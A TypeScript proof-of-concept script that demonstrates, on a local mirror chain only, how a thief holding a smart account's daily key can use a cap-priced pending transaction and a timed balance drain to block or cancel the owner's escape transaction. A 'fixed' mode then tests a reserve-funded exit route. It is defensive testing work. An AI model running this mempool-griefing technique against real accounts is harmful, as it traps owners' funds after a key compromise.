/**
 * A thief with the daily key makes the owner's escape something the mempool will not hold.
 *
 * The sidecar adds up what pending transactions could take from an account, across nonce domains, and refuses whatever would not
 * fit in its balance. So a thief's pending transaction, priced at the daily cost cap, leaves no room for an escape from an account
 * short of ETH. Then the thief can spend what ETH is left, and an escape already admitted is cancelled newest first. Tokens do
 * not pay for gas, so what they are worth does not help. This runs on the mirror only.
 *
 *     vajra escape-solvency         the account paying for its own escape
 *     vajra escape-solvency fixed   the same, then the second route, which pays from its own reserve
 */
import { writeFileSync } from "node:fs";
import { type Address, formatEther, keccak256, parseAbi, parseEther, toHex } from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import {
  DEVNET,
  ETH,
  type FrameTx,
  LEGACY_GAS_PRICE,
  RpcError,
  accountState,
  createExit,
  dailyTx,
  deployments,
  framesSucceeded,
  isLocalStack,
  ops,
  opsV2,
  publicClient,
  refusalNameV2,
  rpc,
  sendAlt,
  sendCanonical,
  signDailyTx,
  signExitTx,
  signMasterTx,
  sleep,
  submit,
  txHash,
  waitForSuccess,
  walletFor,
} from "@vajra/core";
import { loadOrCreateKey } from "@vajra/core/node";
import { keyPath } from "./deploy.ts";
import { master, newAccount, newSigner } from "./zk-run.ts";

if (!isLocalStack) throw new Error("this is an attack: it runs on the local mirror only, with VAJRA_STACK=local");

const fixed = process.argv.includes("fixed");
const erc20 = parseAbi(["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"]);
const deployer = loadOrCreateKey(keyPath("deployer.key"));
const { v2 } = deployments();
const fresh = () => privateKeyToAccount(generatePrivateKey()).address;
const dailyKey = generatePrivateKey();
const daily = privateKeyToAccount(dailyKey).address;
const signer = newSigner();
const harbor = fresh();
const harborSalt = keccak256(toHex("harbor"));
const TOKENS = 25_000_000n;

// 0.02 ETH of free balance after the stake, and 25 tokens: rich in what gas cannot be paid with.
const account = await newAccount(deployer, signer, daily, harbor, harborSalt, parseEther("0.032"));
const { epochSalt } = await accountState(account);
await waitForSuccess(
  await walletFor(deployer).writeContract({ address: DEVNET.usdc, abi: erc20, functionName: "transfer", args: [account, TOKENS], gas: 300_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy", chain: undefined }),
  "funding the tokens",
);
const tokensOf = (who: Address) => publicClient.readContract({ address: DEVNET.usdc, abi: erc20, functionName: "balanceOf", args: [who] });
const balance = () => publicClient.getBalance({ address: account });

const exitTree = newSigner();
let exit: Address | null = null;
if (fixed) {
  exit = await createExit(deployer, v2!.exitFactory!, account, exitTree.root, epochSalt, parseEther("0.01"));
  await submit(master(signer, account, epochSalt, [opsV2.setExit(exit)]));
}

const escapeCalls = [ops.escape(harbor, harborSalt, [DEVNET.usdc])];
const escape = signMasterTx({ signer, account, epochSalt, calls: escapeCalls, maxHashes: 520 }).tx;
console.log(`account ${account}, ${formatEther(await balance())} ETH, ${TOKENS} tokens`);

const outcomes: Record<string, string> = {};
const verdict = async (label: string, send: () => Promise<unknown>) => {
  const outcome = await send().then(
    (hash) => `ADMITTED ${hash}`,
    (error: Error) => `REFUSED ${(error instanceof RpcError ? refusalNameV2(error.message) : error.message).slice(0, 170)}`,
  );
  console.log(`  ${label}: ${outcome}`);
  return outcome;
};
const afterBlock = async () => {
  const head = await publicClient.getBlockNumber();
  while ((await publicClient.getBlockNumber()) === head) await sleep(50);
};
const accountNonce = async () => BigInt(await publicClient.getTransactionCount({ address: account }));

/** A transaction priced right up to the daily cost cap. Unused gas comes back, so this owes the mempool far more than it will ever pay. */
const atTheCap = (nonce: bigint, amount: bigint, to: Address): Promise<FrameTx> => {
  const call = { ...ops.spend(ETH, to, amount), execution: 500_000n, state: 700_000n };
  const gas = 60_000n + call.execution + call.state;
  return signDailyTx(dailyTx({ account, dailyKey: daily, nonce, calls: [call], fees: { maxFeePerGas: parseEther("0.009") / gas, maxPriorityFeePerGas: 0n } }), dailyKey);
};

console.log("\n1. A thief's pending transaction, on the linear nonce, against an escape on a keyed one");
console.log("  the first leaves too little of the balance, so it takes two: the thief burns the rest down to just over the cap");
const thief = fresh();
// Down to 0.0105 ETH, so that 0.009 of pending cost, under the 0.01 cap, leaves no room for an escape's 0.0024.
const nonce0 = await accountNonce();
const drain = await signDailyTx(dailyTx({ account, dailyKey: daily, nonce: nonce0, calls: [ops.spend(ETH, thief, (await balance()) - parseEther("0.0105"))] }), dailyKey);
await submit(drain);
console.log(`  balance now ${formatEther(await balance())} ETH`);
// The drain goes on counting as pending until the reconciler sees it, and it would crowd out the thief too.
await sleep(8000);
await afterBlock();
const held = await atTheCap(await accountNonce(), 0n, thief);
outcomes.thiefPending = await verdict("thief's transaction, at the cap", () => sendAlt(held));
outcomes.escapeAgainstPending = await verdict("the owner's escape, in the same slot", () => sendAlt(escape));
for (let i = 0; i < 20 && (await publicClient.getTransactionCount({ address: account })) === Number(held.nonceSeq); i++) await sleep(500);

console.log("\n2. An escape already in the pool, when the balance falls under it");
// A mined transaction goes on counting until the reconciler sees it, so this waits for that first.
await sleep(8000);
await afterBlock();
// Straight to the node, which the sidecar never hears about. Its balance check then sees only the escape, and admits it.
const left = await balance();
const base = (await publicClient.getBlock()).baseFeePerGas ?? 7n;
const raid = await signDailyTx(dailyTx({ account, dailyKey: daily, nonce: await accountNonce(), calls: [ops.spend(ETH, thief, left - parseEther("0.0015"))], fees: { maxFeePerGas: base + 1n, maxPriorityFeePerGas: 0n } }), dailyKey);
outcomes.raid = await verdict("the thief spends what is left, on the canonical mempool", () => sendCanonical(raid));
// A second into the slot. Measured on the mirror: at 0.3 and 0.6 seconds the sidecar hands the escape to the node first and it wins, at
// 0.9 and 1.2 the raid lands first and the escape is cancelled, and from 1.7 the raid is mined before the escape is even offered.
await sleep(Number(process.env.VAJRA_RAID_DELAY ?? 1000));
outcomes.escapeAdmitted = await verdict("the owner's escape, on the alt mempool", () => sendAlt(escape));
await sleep(8000);
const status = await rpc<{ status: string; reason?: string }>(DEVNET.mempool, "skandha_frameTransactionStatus", [txHash(escape)]).catch((error: Error) => ({ status: "unknown", reason: error.message }));
console.log(`  the escape now: ${status.status}${status.reason ? `, ${status.reason.slice(0, 150)}` : ""}`);
outcomes.escapeStatus = `${status.status}: ${status.reason ?? ""}`.slice(0, 200);
console.log(`  account ${formatEther(await balance())} ETH, ${await tokensOf(account)} tokens, harbor ${await tokensOf(harbor)} tokens`);

console.log("\n3. With the account short of ETH, the escape again");
outcomes.escapeShort = await verdict("the owner's escape", () => sendAlt(escape));
const stuck = await tokensOf(account);
console.log(`  ${stuck} tokens still in the account`);

let result: Record<string, unknown> | null = null;
if (fixed) {
  console.log("\n4. The second route, from its own reserve");
  const out = signExitTx({ signer: exitTree, exit: exit!, account, epochSalt, calls: escapeCalls }).tx;
  const { hash, receipt } = await submit(out, { log: (line) => console.log(`  ${line}`) });
  console.log(`  mined ${hash}, block ${Number(BigInt(receipt.blockNumber))}, all frames ok: ${framesSucceeded(receipt)}`);
  const tokens = await tokensOf(harbor);
  console.log(`  harbor ${tokens} tokens, ${formatEther(await publicClient.getBalance({ address: harbor }))} ETH, account ${await tokensOf(account)} tokens, frozen ${(await accountState(account)).frozen}`);
  result = { hash, tokens: tokens.toString(), framesOk: framesSucceeded(receipt) };
}

writeFileSync(
  new URL(`../../../docs/evidence/escape-solvency-${fixed ? "fixed" : "attack"}-latest.json`, import.meta.url),
  JSON.stringify(
    {
      ranAt: new Date().toISOString(),
      stack: "local mirror: ethrex 9aa3645 + sidecar 2e22ff0 with sidecar-budget-010.patch. NOT run on the public devnet",
      chainId: DEVNET.chainId,
      account,
      exit,
      outcomes,
      tokensStuck: stuck.toString(),
      result,
    },
    null,
    1,
  ) + "\n",
);
process.exit(0);
